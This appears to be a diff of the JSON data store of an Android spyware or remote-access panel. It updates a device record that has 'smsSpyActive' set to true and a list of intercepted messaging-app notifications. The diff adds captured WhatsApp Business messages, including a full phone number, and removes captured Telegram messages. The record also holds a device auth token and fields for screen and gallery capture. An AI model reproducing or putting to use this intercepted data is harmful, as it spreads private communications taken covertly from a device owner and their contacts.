@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637017587,
+    "lastSeen": 1775637047455,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "08/04 15:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637047774
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Ok",
+        "time": "08/04 15:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637047665
+      },
       {
         "appName": "Telegram",
         "sender": "TEAM ZANXRES: You",
@@ -4310,22 +4326,6 @@
         "time": "08/04 14:39",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775633958317
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 14:39",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633958269
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: ABIE super sus",
-        "content": "pgn deh",
-        "time": "08/04 14:39",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633958255
       }
     ],
     "galleryPhotos": [],
